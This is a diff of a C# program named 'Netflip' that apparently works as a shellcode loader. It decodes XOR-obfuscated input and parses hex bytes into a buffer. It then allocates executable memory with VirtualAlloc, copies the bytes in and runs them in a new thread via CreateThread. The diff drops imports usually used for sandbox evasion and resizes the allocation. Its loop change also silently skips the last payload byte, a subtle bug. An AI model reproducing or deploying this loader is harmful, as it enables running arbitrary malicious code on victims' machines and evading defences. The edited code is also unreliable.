@@ -37,7 +37,7 @@ namespace Netflip
 
     class Program
     {
-        [DllImport("kernel32.dll", SetLastError=true, ExactSpelling=true)]
+        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
         static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
         [DllImport("kernel32.dll")]
         static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
@@ -45,10 +45,6 @@ namespace Netflip
         static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
         [DllImport("kernel32.dll")]
         static extern void Sleep(uint dwMilliseconds);
-        [DllImport("kernel32.dll", SetLastError=true, ExactSpelling=true)]
-        static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress, uint dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred);
-        [DllImport("kernel32.dll")]
-        static extern IntPtr GetCurrentProcess();
 
         static StreamWriter streamWriter;
 
@@ -69,12 +65,12 @@ namespace Netflip
 
         static string ConvertInput(string input, int key)
         {
-            string output = "";
-            for (int i = 0; i < input.Length; i++)
+            byte[] output = new byte[input.Length];
+            for (int i = 0; i < input.Length; ++i)
             {
-                output += (char)(input[i] ^ key);
+                output[i] = (byte)(input[i] ^ key);
             }
-            return output;
+            return Encoding.ASCII.GetString(output);
         }
 
         static void RunTests()
@@ -140,7 +136,7 @@ namespace Netflip
                 {
                     hexes = inputText.Split(',');
                     buf = new byte[hexes.Length];
-                    for (int i = 0; i <= hexes.Length - 1; i++)
+                    for (int i = 0; i < hexes.Length - 1; ++i)
                     {
                         buf[i] = Convert.ToByte(hexes[i], 16);
                     }
@@ -150,7 +146,7 @@ namespace Netflip
                     Console.WriteLine("Bad encoding.");
                     System.Environment.Exit(ExitCode.ERROR_BAD_FORMAT);
                 }
-                IntPtr addr = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40);
+                IntPtr addr = VirtualAlloc(IntPtr.Zero, (uint)buf.Length, 0x3000, 0x40);
                 Marshal.Copy(buf, 0, addr, buf.Length);
                 IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
                 WaitForSingleObject(hThread, 0xFFFFFFFF);
@@ -236,5 +232,5 @@ namespace Netflip
             }
         }
     }
-    
+
 }
